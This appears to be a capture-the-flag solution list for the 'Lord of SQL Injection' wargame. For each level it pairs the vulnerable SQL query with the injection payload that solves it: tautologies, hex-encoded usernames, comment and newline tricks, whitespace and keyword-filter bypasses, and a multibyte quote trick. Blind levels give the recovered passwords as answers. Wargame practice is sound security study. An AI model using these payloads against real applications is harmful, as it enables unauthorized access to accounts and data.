# Lord-of-Sql-injection

gremlin

prob : select id from prob_gremlin where id='' and pw=''

solve : ?id=' or 1=1%23


cobolt

prob : select id from prob_cobolt where id='' and pw=md5('')

solve : ?id=' or id='admin'%23


goblin

prob : select id from prob_goblin where id='guest' and no=

solve : ?no=' or id=0x61646d696e


orc(blind)

prob : select id from prob_orc where id='admin' and pw=''

solve : ?pw=095a9852


wolfman

prob : select id from prob_wolfman where id='guest' and pw=''

solve : ?pw=%27||id=0x61646d696e%23


darkelf

prob : select id from prob_darkelf where id='guest' and pw=''

solve : ?pw=%27||id=0x61646d696e%23


orge(blind)

prob : select id from prob_orge where id='guest' and pw=''

solve : ?pw=7b751aec


troll

prob : select id from prob_troll where id='ADmin'

solve : ?pw=AdMin


vampire

prob : select id from prob_vampire where id=''

solve : ?id=adadminmin


skeleton

prob : select id from prob_skeleton where id='guest' and pw='' and 1=0

solve : ?pw=' or id='admin'%23


golem(blind)

prob : select id from prob_golem where id='guest' and pw=''

solve : ?pw=77d6290b


darknight(blind)

prob : select id from prob_darkknight where id='guest' and pw='' and no=

solve : ?pw=0b70ea1f


bugbear(blind)

prob : select id from prob_bugbear where id='guest' and pw='' and no=

solve : ?pw=52dc3991


giant

prob : select 1234 from{$_GET[shit]}prob_giant where 1

solve : ?shit=%0b,?shit=%0c


assasin 

prob : select id from prob_assassin where pw like ''

solve : ?pw=%E%D%

memo : a% , %a , %a%


zombie_assassin

prob : select id from prob_zombie_assassin where id='' and pw=''

solve : pass

memo : %bf' or 1=1--%20 -> %20--1=1 ro '%bf


succubus(pass)

nightmare(pass)


xavis(blind)

prob : select id from prob_xavis where id='admin' and pw=''

solve : ?pw=우왕굳

memo : 한글 ascii


dragon

prob : select id from prob_dragon where id='guest'# and pw=''

solve : ?pw='%0aand pw=12311312312312 or id='admin

memo : %0a -> 줄바꿈  # -> 한줄 주석



